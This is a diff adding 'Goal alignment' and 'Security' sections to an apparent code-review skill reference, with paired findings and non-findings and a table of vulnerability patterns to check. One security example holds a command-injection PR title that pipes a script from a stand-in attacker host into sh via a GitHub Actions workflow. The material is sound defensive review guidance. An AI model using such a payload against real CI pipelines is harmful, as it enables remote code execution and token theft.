@@ -1,6 +1,6 @@
 # Dimensions reference
 
-The four dimensions the [`code-review`](../SKILL.md) skill checks a diff
+The six dimensions the [`code-review`](../SKILL.md) skill checks a diff
 against, each with a real finding and a look-alike that isn't one. The
 distinction in every pair is the same: a finding names a concrete failure
 or cost; a non-finding is a style preference or a hypothetical that doesn't
@@ -20,6 +20,67 @@ isn't defensive about it, but every call site in the diff (and every
 existing call site, checked) passes a value already validated upstream.
 There's no concrete input that reaches this function and fails — it's a
 hypothetical, not a bug in this diff.
+
+## Goal alignment
+
+The diff doesn't do what its stated goals say. Hold it to the goals as the
+PR, ticket, or request wrote them, and try to break each one.
+
+**Finding:** goal 1 (from the linked issue) is "retry Sentry API calls that
+return 429 during `pulumi refresh`." The diff wraps `create` and `update`
+in the retry helper, but `refresh` goes through the provider's `read`
+method, which the diff doesn't touch. The case the issue describes still
+fails on the first 429.
+
+**Finding:** the PR body says "adds a regression test for the empty-batch
+case," but the new test passes `records=[None]`, which takes a different
+branch from `records=[]`. The goal says the case is tested. It isn't.
+
+**Not a finding:** the ticket asks for a 400 on invalid input, and the diff
+returns a 422, which every other endpoint in this app uses for validation
+errors (checked in `api/views.py`). The status code differs from the
+ticket's wording, but the intent is met and follows local convention.
+Mention it in a PR reply if at all, not as a finding.
+
+**Not a finding:** a goal the diff doesn't address because a separate,
+linked PR does. Check the branch's other commits and linked PRs before
+calling a goal unmet.
+
+## Security
+
+A path from attacker-controlled input, or from an exposure the diff
+creates, to a concrete impact. Check the diff for these, and follow any hit
+to confirm it's reachable:
+
+| Area | What to look for |
+|------|------------------|
+| Injection | Raw SQL built with string formatting (`.raw()`, `.extra()`, `cursor.execute(f"...")`); `subprocess` with `shell=True` or a shell string holding input; template output marked safe (`|safe`, `mark_safe`, `dangerouslySetInnerHTML`) on user data |
+| Authorization | A new view, viewset action, or API route whose effective permissions are too broad: `AllowAny` set explicitly, or no `permission_classes` in a project whose `DEFAULT_PERMISSION_CLASSES` setting is unset or permissive (check settings before reporting); object lookups by id that don't scope to the requesting user; admin-only behavior checked in the frontend only |
+| Secrets | Credentials, tokens, or keys committed in code, fixtures, or Pulumi config without `secure:`; secrets written to logs, error messages, Sentry context, or trace attributes |
+| SSRF / outbound requests | A URL or host from a request passed to `requests`/`httpx` without an allowlist; `verify=False` on TLS |
+| Deserialization / files | `pickle.loads`, `yaml.load` without `SafeLoader`, `eval`/`exec` on input; a file path joined from input without normalizing and checking it stays under its base directory |
+| CI workflows | `pull_request_target` or `workflow_run` that checks out and runs the PR head; attacker-controlled context interpolated directly into a `run:` step: `github.head_ref`, PR/issue titles and bodies, comment bodies, commit messages, branch names (numeric fields like `github.event.pull_request.number` are not injectable); `permissions:` broader than the job needs, when the job also runs untrusted input |
+| Infrastructure | Security group ingress from `0.0.0.0/0` or `::/0` on anything but public 80/443; IAM or Vault policies with `*` actions or resources where a narrower set works; public S3 buckets or ACLs; Kubernetes pods that are privileged, use `hostPath`, or mount a service account token they don't need |
+| Dependencies | A new package from a git URL, a non-default index, or a name one character off from a well-known package |
+
+**Finding:** a new GitHub Actions step runs `echo "${{
+github.event.pull_request.title }}" >> $GITHUB_STEP_SUMMARY` in a workflow
+triggered by `pull_request_target`. A PR from a fork titled `";curl
+attacker.sh|sh;"` executes in a job that has `GITHUB_TOKEN` with `contents:
+write`.
+
+**Finding:** a new DRF `@action` on `CourseViewSet` sets
+`permission_classes=[IsAuthenticated]` and calls
+`Enrollment.objects.get(id=pk)`. Any logged-in learner can read another
+learner's enrollment, including their email, by incrementing `pk`.
+
+**Not a finding:** `subprocess.run(cmd, shell=True)` in a management command
+where `cmd` is a constant string in the same file. No input reaches it.
+
+**Not a finding:** a security group allowing `0.0.0.0/0` on 443 for an
+internet-facing ALB. That is the resource's purpose. Report it only when the
+same rule lands on something meant to be internal, such as a database or a
+node group.
 
 ## Simplification
 
